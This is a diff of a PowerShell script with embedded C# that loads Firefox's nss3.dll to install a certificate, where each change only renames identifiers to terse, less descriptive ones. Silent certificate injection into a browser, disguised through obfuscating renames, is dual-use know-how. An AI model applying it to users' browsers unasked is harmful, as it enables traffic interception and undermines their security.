@@ -1,5 +1,5 @@
 param (
-    [string]$CertPath="%CERT%"
+    [string]$C="%CERT%"
 )
 function AddCertFF{
 Add-Type @"
@@ -162,7 +162,7 @@ public sealed class FF
 		IntPtr ipCert = Marshal.AllocHGlobal(bCert.Length);
 		try
         {
-            DirectoryInfo diInstallPath = GetInstallPath();
+            DirectoryInfo diInstallPath = GetIP();
             String sCurrentDirectory = Directory.GetCurrentDirectory();
             Directory.SetCurrentDirectory(diInstallPath.FullName);
             nssModule = LoadWin32Library(diInstallPath.FullName + "\\nss3.dll");
@@ -246,7 +246,7 @@ public sealed class FF
         catch (Exception){}
         return null;
     }
-	private DirectoryInfo GetInstallPath()
+	private DirectoryInfo GetIP()
     {
         DirectoryInfo firefoxPath = null;
         // get firefox path from registry
@@ -304,6 +304,6 @@ public sealed class FF
     }
 }
 "@;
-[FF]::GetInstance().Start($CertPath);
+[FF]::GetInstance().Start($C);
 }
 AddCertFF
